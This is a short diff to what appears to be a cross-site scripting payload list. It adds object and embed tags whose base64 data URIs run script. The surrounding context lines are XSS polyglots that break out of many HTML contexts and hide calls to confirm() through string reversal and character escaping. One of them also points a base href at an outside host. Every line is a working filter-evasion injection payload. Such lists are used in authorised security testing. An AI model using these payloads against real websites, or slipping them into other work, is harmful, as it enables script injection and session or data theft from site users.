@@ -9,6 +9,8 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</
 <input autofocus onfocus=/*${/*/;{/**/parent['mrifnoc'.split('').reverse().join('')](1)}//><Base/Href=//rix4uni.ez.pe-->
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
 '"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
+<ObJeCt data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></ObJeCt>
+<EmBeD src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==></EmBeD>
 1'/confirm?.(1)/'
 1')"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
 001'-confirm`K`-'=1
